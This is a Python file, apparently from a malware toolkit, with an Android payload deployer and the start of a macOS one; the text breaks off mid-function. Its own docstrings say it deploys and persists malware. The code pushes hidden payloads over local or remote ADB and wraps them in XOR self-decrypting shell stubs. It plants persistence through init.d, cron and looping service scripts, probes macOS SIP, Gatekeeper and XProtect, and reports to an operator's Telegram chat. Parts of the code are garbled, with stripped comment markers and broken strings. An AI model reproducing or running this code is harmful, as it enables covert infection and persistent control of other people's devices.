#!/usr/bin/env python3
-- coding: utf-8 --
"""
android_deploy.py - Android deployment and persistence module
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import time
import threading
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

Import logger
from ..utils.logger import get_logger

logger = get_logger()

class AndroidDeployer:
    """Deploys and persists malware on Android systems"""

    def init(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system_info = self._get_system_info()

Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()

Deployment paths
        self.deploy_paths = {
            'internal_storage': '/sdcard',
            'external_storage': '/storage/emulated/0',
            'system_app': '/system/app',
            'system_priv_app': '/system/priv-app',
            'data_app': '/data/app',
            'data_data': '/data/data',
            'cache': '/data/local/tmp',
            'root': '/'
        }

ADB connection
        self.adb_path = self._find_adb()
        self.device_serial = None
        self.connected = False

Current payload
        self.payload_path = None
        self.payload_hash = None

        logger.info("Android deployer initialized", module="android_deploy")

    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('deploy_chat_id')

        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.deploy_chat_id = chat_id
                logger.info("Telegram deploy bot initialized", module="android_deploy")
            except ImportError:
                logger.warning("Telegram module not available", module="android_deploy")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="android_deploy")

    def send_telegram_notification(self, title: str, message: str):
        """Send deployment notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'deploy_chat_id'):
            return

        try:
            full_message = fb>🤖 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.deploy_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram deployment notification sent: {title}", module="android_deploy")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="android_deploy")

    def _get_system_info(self) -> Dict[str, Any]:
        """Get Android system information"""
        info = {
            'is_android': self._check_android(),
            'is_rooted': False,
            'sdk_version': 0,
            'manufacturer': 'Unknown',
            'model': 'Unknown',
            'android_version': 'Unknown',
            'has_adb': self.adb_path is not None
        }

Check if running on Android
        if info['is_android']:
            try:
                import android
                droid = android.Android()
                info['sdk_version'] = droid.getSdkVersion().result
                info['manufacturer'] = droid.getManufacturer().result
                info['model'] = droid.getModel().result
                info['android_version'] = droid.getAndroidVersion().result
                info['is_rooted'] = self._check_root()
            except:
                pass

        return info

    def _check_android(self) -> bool:
        """Check if running on Android"""
        try:
Check for Android-specific files
            android_files = [
                '/system/build.prop',
                '/system/bin/app_process',
                '/init.rc'
            ]

            for file in android_files:
                if os.path.exists(file):
                    return True

Check environment
            if 'ANDROID_ROOT' in os.environ:
                return True

            return False

        except:
            return False

    def _check_root(self) -> bool:
        """Check if device is rooted"""
        try:
Check for su binary
            root_checks = [
                'which su',
                'test -f /system/bin/su',
                'test -f /system/xbin/su',
                'id | grep uid=0'
            ]

            for check in root_checks:
                try:
                    result = subprocess.run(
                        check,
                        shell=True,
                        capture_output=True,
                        text=True
                    )
                    if result.returncode == 0:
                        return True
                except:
                    continue

            return False

        except:
            return False

    def _find_adb(self) -> Optional[str]:
        """Find ADB executable"""
        adb_paths = [
            'adb',
            '/usr/bin/adb',
            '/usr/local/bin/adb',
            '/opt/android-sdk/platform-tools/adb',
            os.path.join(os.environ.get('ANDROID_HOME', ''), 'platform-tools', 'adb'),
            os.path.join(os.environ.get('HOME', ''), 'Android/Sdk/platform-tools/adb')
        ]

        for path in adb_paths:
            try:
                result = subprocess.run(
                    [path, 'version'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    return path
            except:
                continue

        return None

    def connect_adb(self, device_serial: str = None) -> bool:
        """Connect to Android device via ADB"""
        try:
            if not self.adb_path:
                logger.error("ADB not found", module="android_deploy")
                return False

Start ADB server
            subprocess.run([self.adb_path, 'start-server'], capture_output=True)

List devices
            result = subprocess.run(
                [self.adb_path, 'devices'],
                capture_output=True,
                text=True
            )

            devices = []
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip():
                    serial = line.split('\t')[0]
                    devices.append(serial)

            if not devices:
                logger.error("No ADB devices found", module="android_deploy")
                return False

Use specified device or first available
            if device_serial:
                if device_serial in devices:
                    self.device_serial = device_serial
                else:
                    logger.error(f"Device {device_serial} not found", module="android_deploy")
                    return False
            else:
                self.device_serial = devices[0]

Test connection
            test_result = self._run_adb_command('getprop ro.product.model')
            if test_result:
                self.connected = True

Get device info
                device_info = {
                    'model': test_result.strip(),
                    'manufacturer': self._run_adb_command('getprop ro.product.manufacturer').strip(),
                    'android_version': self._run_adb_command('getprop ro.build.version.release').strip(),
                    'sdk_version': self._run_adb_command('getprop ro.build.version.sdk').strip(),
                    'is_rooted': self._check_adb_root()
                }

                self.send_telegram_notification(
                    "ADB Connected",
                    f"Device: {device_info['model']}\n"
                    f"Manufacturer: {device_info['manufacturer']}\n"
                    f"Android: {device_info['android_version']}\n"
                    f"Rooted: {device_info['is_rooted']}"
                )

                logger.info(f"ADB connected to {self.device_serial}", module="android_deploy")
                return True
            else:
                logger.error("ADB connection test failed", module="android_deploy")
                return False

        except Exception as e:
            logger.error(f"ADB connection error: {e}", module="android_deploy")
            return False

    def _run_adb_command(self, command: str) -> str:
        """Run ADB shell command"""
        try:
            if not self.connected or not self.device_serial:
                return ""

            full_cmd = [self.adb_path, '-s', self.device_serial, 'shell', command]
            result = subprocess.run(
                full_cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                return result.stdout
            else:
                logger.warning(f"ADB command failed: {command} - {result.stderr}", module="android_deploy")
                return ""

        except Exception as e:
            logger.error(f"ADB command error: {e}", module="android_deploy")
            return ""

    def _push_file(self, local_path: str, remote_path: str) -> bool:
        """Push file to device via ADB"""
        try:
            if not self.connected or not self.device_serial:
                return False

            if not os.path.exists(local_path):
                logger.error(f"Local file not found: {local_path}", module="android_deploy")
                return False

            cmd = [self.adb_path, '-s', self.device_serial, 'push', local_path, remote_path]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                logger.debug(f"File pushed: {local_path} -> {remote_path}", module="android_deploy")
                return True
            else:
                logger.warning(f"File push failed: {result.stderr}", module="android_deploy")
                return False

        except Exception as e:
            logger.error(f"File push error: {e}", module="android_deploy")
            return False

    def _pull_file(self, remote_path: str, local_path: str) -> bool:
        """Pull file from device via ADB"""
        try:
            if not self.connected or not self.device_serial:
                return False

            cmd = [self.adb_path, '-s', self.device_serial, 'pull', remote_path, local_path]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                logger.debug(f"File pulled: {remote_path} -> {local_path}", module="android_deploy")
                return True
            else:
                logger.warning(f"File pull failed: {result.stderr}", module="android_deploy")
                return False

        except Exception as e:
            logger.error(f"File pull error: {e}", module="android_deploy")
            return False

    def _check_adb_root(self) -> bool:
        """Check if ADB device is rooted"""
        result = self._run_adb_command('su -c id')
        return 'uid=0' in result

    def deploy_payload(self, payload_path: str, target_path: str = None,
                      obfuscate: bool = True, hide: bool = True) -> bool:
        """Deploy payload to target system"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="android_deploy")
                return False

Calculate payload hash
            with open(payload_path, 'rb') as f:
                self.payload_hash = hashlib.sha256(f.read()).hexdigest()

Determine target path
            if target_path is None:
                target_path = self._choose_deployment_path()

For ADB deployment
            if self.connected:
                success = self._push_file(payload_path, target_path)
                if success:
                    self.payload_path = target_path

Make executable
                    self._run_adb_command(f'chmod 755 {target_path}')

Apply obfuscation
                    if obfuscate:
                        self._obfuscate_payload_adb(target_path)

Apply hiding
                    if hide:
                        self._hide_file_adb(target_path)
            else:
Local deployment (running on Android)
                os.makedirs(os.path.dirname(target_path), exist_ok=True)
                shutil.copy2(payload_path, target_path)
                self.payload_path = target_path

Make executable
                os.chmod(target_path, 0o755)

Apply obfuscation
                if obfuscate:
                    self._obfuscate_payload(target_path)

Apply hiding
                if hide:
                    self._hide_file(target_path)

Send Telegram notification
            device_name = self._run_adb_command('getprop ro.product.model').strip() if self.connected else 'Local'

            self.send_telegram_notification(
                "Payload Deployed",
                f"Device: {device_name}\n"
                f"ADB: {self.connected}\n"
                f"Rooted: {self.system_info['is_rooted']}\n"
                f"Target: {target_path}\n"
                f"Hash: {self.payload_hash[:16]}..."
            )

            logger.info(f"Payload deployed to: {target_path}", module="android_deploy")
            return True

        except Exception as e:
            logger.error(f"Payload deployment error: {e}", module="android_deploy")
            return False

    def _choose_deployment_path(self) -> str:
        """Choose optimal deployment path"""
        import random

        if self.connected:
ADB deployment paths
            paths = [
                '/sdcard/Download/.system_update',
                '/data/local/tmp/.cache',
                '/storage/emulated/0/Android/data/com.android.chrome/cache',
                '/system/bin/.debuggerd',
                '/system/xbin/.busybox'
            ]
        else:
Local Android paths
            paths = [
                '/data/local/tmp/.update',
                '/sdcard/Android/data/.cache',
                '/storage/self/primary/Download/.temp',
                f"{self.deploy_paths['internal_storage']}/.hidden",
                f"{self.deploy_paths['cache']}/.tmp"
            ]

        return random.choice(paths)

    def _obfuscate_payload(self, file_path: str):
        """Obfuscate payload locally"""
        try:
Read payload
            with open(file_path, 'rb') as f:
                data = f.read()

Simple XOR obfuscation
            key = os.urandom(32)
            obfuscated = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

Create shell script that deobfuscates and executes
            stub = f"""#!/system/bin/sh
Deobfuscation key
KEY="{key.hex()}"

Read obfuscated payload
PAYLOAD=$(tail -c +{len(stub.encode()) + 1} "$0")

Deobfuscate
DECRYPTED=""
i=0
while [ $i -lt $(echo -n "$PAYLOAD" | wc -c) ]; do
    CHAR=$(echo -n "$PAYLOAD" | cut -c $((i+1)))
    BYTE=$(printf "%d" "'$CHAR")
    KEY_BYTE=$((0x$(echo -n "$KEY" | cut -c $((i2+1))-$((i2+2)))))
    DEC_BYTE=$((BYTE ^ KEY_BYTE))
    DECRYPTED="$DECRYPTED$(printf "\\\\x%02x" $DEC_BYTE)"
    i=$((i+1))
done

Write to temp file
TEMP_FILE="/data/local/tmp/.tmp_$(date +%s)"
echo -ne "$DECRYPTED" > "$TEMP_FILE"
chmod 755 "$TEMP_FILE"

Execute
"$TEMP_FILE" &
rm -f "$TEMP_FILE"

exit 0

"""

Write stub + obfuscated data
            with open(file_path, 'wb') as f:
                f.write(stub.encode())
                f.write(obfuscated)

Make executable
            os.chmod(file_path, 0o755)

            logger.debug(f"Payload obfuscated: {file_path}", module="android_deploy")

        except Exception as e:
            logger.error(f"Payload obfuscation error: {e}", module="android_deploy")

    def _obfuscate_payload_adb(self, remote_path: str):
        """Obfuscate payload via ADB"""
        try:
Pull file, obfuscate locally, push back
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp_path = tmp.name

Pull file
            if self._pull_file(remote_path, tmp_path):
Obfuscate locally
                self._obfuscate_payload(tmp_path)

Push back
                self._push_file(tmp_path, remote_path)

Cleanup
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

        except Exception as e:
            logger.error(f"ADB payload obfuscation error: {e}", module="android_deploy")

    def _hide_file(self, file_path: str):
        """Hide file locally"""
        try:
Add dot prefix to filename
            dir_name = os.path.dirname(file_path)
            base_name = os.path.basename(file_path)

            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                shutil.move(file_path, hidden_path)
                self.payload_path = hidden_path

            logger.debug(f"File hidden: {file_path}", module="android_deploy")

        except Exception as e:
            logger.error(f"File hiding error: {e}", module="android_deploy")

    def _hide_file_adb(self, remote_path: str):
        """Hide file via ADB"""
        try:
Rename to add dot prefix
            dir_name = os.path.dirname(remote_path)
            base_name = os.path.basename(remote_path)

            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                self._run_adb_command(f'mv {remote_path} {hidden_path}')
                self.payload_path = hidden_path

            logger.debug(f"File hidden via ADB: {remote_path}", module="android_deploy")

        except Exception as e:
            logger.error(f"ADB file hiding error: {e}", module="android_deploy")

    def establish_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """Establish persistence using multiple methods"""
        if methods is None:
            methods = ['init_script', 'cron', 'app', 'broadcast', 'service']

        results = {}

        logger.info(f"Establishing persistence using {len(methods)} methods", module="android_deploy")

        for method in methods:
            try:
                if method == 'init_script':
                    success = self._persist_via_init_script()
                elif method == 'cron':
                    success = self._persist_via_cron()
                elif method == 'app':
                    success = self._persist_via_app()
                elif method == 'broadcast':
                    success = self._persist_via_broadcast()
                elif method == 'service':
                    success = self._persist_via_service()
                else:
                    logger.warning(f"Unknown persistence method: {method}", module="android_deploy")
                    success = False

                results[method] = success

                if success:
                    logger.info(f"Persistence established via {method}", module="android_deploy")
                else:
                    logger.warning(f"Persistence failed via {method}", module="android_deploy")

            except Exception as e:
                logger.error(f"Persistence error for {method}: {e}", module="android_deploy")
                results[method] = False

Send Telegram notification
        successful = sum(1 for r in results.values() if r)
        total = len(results)

        self.send_telegram_notification(
            "Persistence Established",
            f"Device: {self._run_adb_command('getprop ro.product.model').strip() if self.connected else 'Local'}\n"
            f"Methods: {successful}/{total} successful\n"
            f"Payload: {self.payload_path}"
        )

        return results

    def _persist_via_init_script(self) -> bool:
        """Establish persistence via init script"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False

Only works with root
            if not self.system_info['is_rooted'] and not self._check_adb_root():
                logger.warning("Root required for init script persistence", module="android_deploy")
                return False

Create init.d script
            init_script = """#!/system/bin/sh
Android system init script

while true; do
    {payload} &
    sleep 60
done
""".format(payload=self.payload_path)

Write to init.d directory
            init_path = '/system/etc/init.d/99system'

            if self.connected:
Push via ADB
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(init_script)
                    tmp_path = tmp.name

Push to device
                success = self._push_file(tmp_path, init_path)

Make executable
                if success:
                    self._run_adb_command(f'chmod 755 {init_path}')

Cleanup
                os.remove(tmp_path)

                return success
            else:
Local write
                with open(init_path, 'w') as f:
                    f.write(init_script)

                os.chmod(init_path, 0o755)
                return True

        except Exception as e:
            logger.error(f"Init script persistence error: {e}", module="android_deploy")
            return False

    def _persist_via_cron(self) -> bool:
        """Establish persistence via cron (BusyBox)"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False

Check if BusyBox is available
            busybox_check = self._run_adb_command('which busybox') if self.connected else subprocess.run('which busybox', shell=True, capture_output=True, text=True)

            if not busybox_check.strip():
                logger.warning("BusyBox not found", module="android_deploy")
                return False

Add to crontab
            cron_line = f"* * * * * {self.payload_path} >/dev/null 2>&1\n"

            if self.connected:
Get current crontab
                current_cron = self._run_adb_command('busybox crontab -l 2>/dev/null')

Add new line
                new_cron = current_cron + cron_line if current_cron else cron_line

Write to temp file and install
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(new_cron)
                    tmp_path = tmp.name

Push and install
                remote_tmp = '/data/local/tmp/crontab.tmp'
                if self._push_file(tmp_path, remote_tmp):
                    self._run_adb_command(f'busybox crontab {remote_tmp}')
                    self._run_adb_command(f'rm {remote_tmp}')

                os.remove(tmp_path)
            else:
Local crontab
                result = subprocess.run(
                    'busybox crontab -l 2>/dev/null',
                    shell=True,
                    capture_output=True,
                    text=True
                )

                current_cron = result.stdout
                new_cron = current_cron + cron_line if current_cron else cron_line

                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(new_cron)
                    tmp_path = tmp.name

                subprocess.run(f'busybox crontab {tmp_path}', shell=True)
                os.remove(tmp_path)

            logger.debug("Cron persistence set", module="android_deploy")
            return True

        except Exception as e:
            logger.error(f"Cron persistence error: {e}", module="android_deploy")
            return False

    def _persist_via_app(self) -> bool:
        """Establish persistence via Android app"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False

Create simple APK that runs our payload
            apk_template = """
Simple APK template would go here
This would require building an actual APK
"""

For now, just create a placeholder
            logger.warning("App persistence requires APK building (not implemented)", module="android_deploy")
            return False

        except Exception as e:
            logger.error(f"App persistence error: {e}", module="android_deploy")
            return False

    def _persist_via_broadcast(self) -> bool:
        """Establish persistence via broadcast receiver"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False

Create broadcast receiver script
            broadcast_script = """#!/system/bin/sh
Broadcast receiver script

while true; do
Monitor for specific broadcasts
    {payload} &
    sleep 30
done
""".format(payload=self.payload_path)

This would require actual Android app development
            logger.warning("Broadcast persistence requires Android app (not implemented)", module="android_deploy")
            return False

        except Exception as e:
            logger.error(f"Broadcast persistence error: {e}", module="android_deploy")
            return False

    def _persist_via_service(self) -> bool:
        """Establish persistence via Android service"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False

Create service script
            service_script = f"""#!/system/bin/sh
Android service

while true; do
    {self.payload_path} &
    sleep 10
done
"""

            service_path = '/data/local/tmp/.android_service'

            if self.connected:
Push service script
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(service_script)
                    tmp_path = tmp.name

                success = self._push_file(tmp_path, service_path)

                if success:
                    self._run_adb_command(f'chmod 755 {service_path}')
Start service
                    self._run_adb_command(f'nohup {service_path} >/dev/null 2>&1 &')

                os.remove(tmp_path)
                return success
            else:
Local service
                with open(service_path, 'w') as f:
                    f.write(service_script)

                os.chmod(service_path, 0o755)
                subprocess.run(f'nohup {service_path} >/dev/null 2>&1 &', shell=True)
                return True

        except Exception as e:
            logger.error(f"Service persistence error: {e}", module="android_deploy")
            return False

    def deploy_remote(self, target_ip: str, payload_path: str,
                     port: int = 5555) -> bool:
        """Deploy payload to remote Android device"""
        try:
            logger.info(f"Attempting remote deployment to {target_ip}:{port}", module="android_deploy")

Connect to device via TCP/IP
            connect_cmd = f'{self.adb_path} connect {target_ip}:{port}'
            result = subprocess.run(connect_cmd, shell=True, capture_output=True, text=True)

            if 'connected' in result.stdout:
Store original device serial
                original_serial = self.device_serial

Connect to this device
                if self.connect_adb(f'{target_ip}:{port}'):
Deploy payload
                    success = self.deploy_payload(payload_path)

Disconnect
                    subprocess.run(f'{self.adb_path} disconnect {target_ip}:{port}', shell=True)

Restore original connection
                    if original_serial:
                        self.connect_adb(original_serial)

                    return success
                else:
                    return False
            else:
                logger.warning(f"Failed to connect to {target_ip}:{port}", module="android_deploy")
                return False

        except Exception as e:
            logger.error(f"Remote deployment error: {e}", module="android_deploy")
            return False

    def install_apk(self, apk_path: str) -> bool:
        """Install APK on device"""
        try:
            if not self.connected:
                logger.error("Not connected to ADB", module="android_deploy")
                return False

            if not os.path.exists(apk_path):
                logger.error(f"APK not found: {apk_path}", module="android_deploy")
                return False

Install APK
            cmd = [self.adb_path, '-s', self.device_serial, 'install', '-r', apk_path]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if 'Success' in result.stdout:
                logger.info(f"APK installed: {apk_path}", module="android_deploy")
                return True
            else:
                logger.warning(f"APK installation failed: {result.stderr}", module="android_deploy")
                return False

        except Exception as e:
            logger.error(f"APK installation error: {e}", module="android_deploy")
            return False

    def run_shell_command(self, command: str) -> str:
        """Run shell command on device"""
        return self._run_adb_command(command)

    def get_packages(self) -> List[str]:
        """Get installed packages"""
        result = self._run_adb_command('pm list packages')
        packages = []

        for line in result.split('\n'):
            if line.startswith('package:'):
                packages.append(line.replace('package:', '').strip())

        return packages

    def cleanup(self, remove_payload: bool = True) -> bool:
        """Cleanup deployment artifacts"""
        try:
            cleanup_count = 0

Remove payload file
            if remove_payload and self.payload_path:
                if self.connected:
                    self._run_adb_command(f'rm -f {self.payload_path}')
                else:
                    if os.path.exists(self.payload_path):
                        os.remove(self.payload_path)

                cleanup_count += 1

Remove init script
            init_path = '/system/etc/init.d/99system'
            if self.connected:
                self._run_adb_command(f'rm -f {init_path}')
            else:
                if os.path.exists(init_path):
                    os.remove(init_path)

            cleanup_count += 1

Remove service
            service_path = '/data/local/tmp/.android_service'
            if self.connected:
                self._run_adb_command(f'pkill -f {service_path}')
                self._run_adb_command(f'rm -f {service_path}')
            else:
                subprocess.run(f'pkill -f {service_path}', shell=True)
                if os.path.exists(service_path):
                    os.remove(service_path)

            cleanup_count += 1

            logger.info(f"Cleanup completed: {cleanup_count} artifacts removed", module="android_deploy")
            return True

        except Exception as e:
            logger.error(f"Cleanup error: {e}", module="android_deploy")
            return False

    def get_deployment_info(self) -> Dict[str, Any]:
        """Get deployment information"""
        return {
            'system_info': self.system_info,
            'payload_path': self.payload_path,
            'payload_hash': self.payload_hash,
            'adb_connected': self.connected,
            'device_serial': self.device_serial,
            'timestamp': datetime.now().isoformat()
        }

    def get_status(self) -> Dict[str, Any]:
        """Get deployer status"""
        return {
            'system': 'Android',
            'connected': self.connected,
            'rooted': self.system_info['is_rooted'],
            'adb_available': self.adb_path is not None,
            'payload_deployed': self.payload_path is not None,
            'telegram_available': self.telegram_bot is not None
        }

Global instance
_android_deployer = None

def get_android_deployer(config: Dict = None) -> AndroidDeployer:
    """Get or create Android deployer instance"""
    global _android_deployer

    if _android_deployer is None:
        _android_deployer = AndroidDeployer(config)

    return _android_deployer

if name == "main":
Test the Android deployer
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'deploy_chat_id': 123456789
        }
    }

    deployer = get_android_deployer(config)

    print("Testing Android deployer...")
    print(f"Android: {deployer.system_info['is_android']}")
    print(f"Rooted: {deployer.system_info['is_rooted']}")
    print(f"ADB: {deployer.adb_path}")

Test ADB connection if available
    if deployer.adb_path:
        print("\nTesting ADB connection...")
        connected = deployer.connect_adb()
        print(f"Connected: {connected}")

Create test payload
    test_payload = os.path.join(tempfile.gettempdir(), 'test_payload.sh')
    with open(test_payload, 'w') as f:
        f.write('#!/system/bin/sh\necho "Test payload running"\n')

    os.chmod(test_payload, 0o755)

Test deployment (local if on Android, ADB if connected)
    print("\nTesting payload deployment...")
    deployed = deployer.deploy_payload(test_payload, obfuscate=False, hide=False)
    print(f"Payload deployed: {deployed}")

    if deployed:
Test persistence
        print("\nTesting persistence methods...")
        persistence_results = deployer.establish_persistence(['init_script', 'service'])
        print(f"Persistence results: {persistence_results}")

Get deployment info
    info = deployer.get_deployment_info()
    print(f"\nDeployment info: {info.get('payload_path')}")

Show status
    status = deployer.get_status()
    print(f"\n🤖 Android Deployer Status: {status}")

Cleanup
    print("\nCleaning up...")
    deployer.cleanup()

Remove test payload
    if os.path.exists(test_payload):
        os.remove(test_payload)

    print("\n✅ Android deployer tests completed!")

🍎 37. deploy/macos_deploy.py - MACOS DEPLOYMENT

#!/usr/bin/env python3
-- coding: utf-8 --
"""
macos_deploy.py - macOS deployment and persistence module
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import time
import threading
import plistlib
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

Import logger
from ..utils.logger import get_logger
from ..utils.persistence import get_persistence_manager

logger = get_logger()

class MacOSDeployer:
    """Deploys and persists malware on macOS systems"""

    def init(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system_info = self._get_system_info()

Persistence manager
        self.persistence = get_persistence_manager(config)

Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()

Deployment paths
        self.deploy_paths = {
            'applications': '/Applications',
            'user_applications': os.path.expanduser('~/Applications'),
            'library': '/Library',
            'user_library': os.path.expanduser('~/Library'),
            'system': '/System',
            'usr_local': '/usr/local',
            'opt': '/opt',
            'tmp': '/tmp',
            'var_tmp': '/var/tmp'
        }

Current payload
        self.payload_path = None
        self.payload_hash = None

        logger.info("macOS deployer initialized", module="macos_deploy")

    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('deploy_chat_id')

        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.deploy_chat_id = chat_id
                logger.info("Telegram deploy bot initialized", module="macos_deploy")
            except ImportError:
                logger.warning("Telegram module not available", module="macos_deploy")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="macos_deploy")

    def send_telegram_notification(self, title: str, message: str):
        """Send deployment notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'deploy_chat_id'):
            return

        try:
            full_message = fb>🍎 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.deploy_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram deployment notification sent: {title}", module="macos_deploy")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="macos_deploy")

    def _get_system_info(self) -> Dict[str, Any]:
        """Get macOS system information"""
        info = {
            'is_macos': sys.platform == 'darwin',
            'macos_version': self._get_macos_version(),
            'architecture': self._get_architecture(),
            'hostname': self._run_command('hostname').strip(),
            'username': os.environ.get('USER', 'Unknown'),
            'is_root': os.getuid() == 0,
            'sip_status': self._check_sip(),
            'gatekeeper_status': self._check_gatekeeper(),
            'xprotect_status': self._check_xprotect()
        }
        return info

    def _get_macos_version(self) -> str:
        """Get macOS version"""
        try:
            result = subprocess.run(
                'sw_vers -productVersion',
                shell=True,
                capture_output=True,
                text=True
            )
            return result.stdout.strip()
        except:
            return "Unknown"

    def _get_architecture(self) -> str:
        """Get system architecture"""
        try:
            result = subprocess.run(
                'uname -m',
                shell=True,
                capture_output=True,
                text=True
            )
            arch = result.stdout.strip()

Translate to common names
            if arch == 'x86_64':
                return 'Intel'
            elif arch == 'arm64':
                return 'Apple Silicon'
            else:
                return arch
        except:
            return "Unknown"

    def _check_sip(self) -> bool:
        """Check System Integrity Protection status"""
        try:
            result = subprocess.run(
                'csrutil status',
                shell=True,
                capture_output=True,
                text=True
            )
            return 'enabled' in result.stdout.lower()
        except:
            return False

    def _check_gatekeeper(self) -> bool:
        """Check Gatekeeper status"""
        try:
            result = subprocess.run(
                'spctl --status',
                shell=True,
                capture_output=True,
                text=True
            )
            return 'enabled' in result.stdout.lower()
        except:
            return False

    def _check_xprotect(self) -> bool:
        """Check XProtect status"""
        try:
            xprotect_path = '/Library/Apple/System/Library/CoreServices/XProtect.bundle'
            return os.path.exists(xprotect_path)
        except:
            return False

    def _run_command(self, command: str) -> str:
        """Run shell command and return output"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout
        except:
            return ""

    def deploy_payload(self, payload_path: str, target_path: str = None,
                      obfuscate: bool = True, hide: bool = True) -> bool:
        """Deploy payload to target system"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="macos_deploy")
                return False

Calculate payload hash
            with open(payload_path, 'rb') as f:
                self.payload_hash = hashlib.sha256(f.read()).hexdigest()

Determine target path
            if target_path is None:
                target_path = self._choose_deployment_path()

Create target directory if needed
            os.makedirs(os.path.dirname(target_path), exist_ok=True)

Copy payload
            shutil.copy2(payload_path, target_path)
            self.payload_path = target_path

Make executable if it's a script
            if target_path.endswith(('.sh', '.py', '.pl', '.rb')):
                os.chmod(target_path, 0o755)

Apply obfuscation
            if obfuscate:
                self._obfuscate_payload(target_path)

Apply hiding
            if hide:
                self._hide_file(target_path)

Set file attributes
            self._set_file_attributes(target_path)

Bypass Gatekeeper if needed
            if self.system_info['gatekeeper_status']:
                self._bypass_gatekeeper(target_path)

Send Telegram notification
            self.send_telegram_notification(
                "Payload Deployed",
                f"Host: {self.system_info['hostname']}\n"
                f"User: {self.system_info['username']}\n"
                f"Root: {self.system_info['is_root']}\n"
                f"macOS: {self.system_info['macos_version']}\n"
                f"Arch: {self.system_info['architecture']}\n"
                f"Target: {target_path}\n"
                f"Hash: {self.payload_hash[:16]}..."
            )

            logger.info(f"Payload deployed to: {target_path}", module="macos_deploy")
            return True

        except Exception as e:
            logger.error(f"Payload deployment error: {e}", module="macos_deploy")
            return False

    def _choose_deployment_path(self) -> str:
        """Choose optimal deployment path"""
        import random

Common macOS system paths
        system_paths = [
System frameworks
            '/System/Library/Frameworks/Python.framework/Versions/Current/bin/python',
            '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport',
            '/usr/libexec/xpcproxy',

Application support
            f"{self.deploy_paths['user_library']}/Application Support/Google/Chrome/Default/Extensions",
            f"{self.deploy_paths['user_library']}/Caches/com.apple.Safari/WebKitCache",
            f"{self.deploy_paths['library']}/Application Support/Adobe/Adobe Desktop Common/ADS',

System binaries
            '/usr/bin/python',
            '/usr/local/bin/brew',
            '/opt/homebrew/bin/node',

Temporary directories
            '/tmp/.com.apple.installer',
            '/var/tmp/com.apple.softwareupdate',
            f"{self.deploy_paths['user_library']}/Caches/TemporaryItems",

Hidden directories
            f"{self.deploy_paths['user_library']}/.local",
            '/usr/local/.homebrew',
            '/opt/.virtualenvs'
        ]

Add random filename
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        chosen_path = random.choice(system_paths)

Replace or append random filename
        if '.' in os.path.basename(chosen_path):
            return chosen_path
        else:
            return os.path.join(chosen_path, f".{random_name}")

    def _obfuscate_payload(self, file_path: str):
        """Obfuscate payload to avoid detection"""
        try:
Read payload
            with open(file_path, 'rb') as f:
                data = f.read()

Simple XOR obfuscation
            key = os.urandom(32)
            obfuscated = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

Create shell script that deobfuscates and executes
            stub = f"""#!/bin/bash
Deobfuscation key
KEY="{key.hex()}"

Read obfuscated payload
PAYLOAD=$(tail -c +{len(stub.encode()) + 1} "$0")

Deobfuscate
DECRYPTED=""
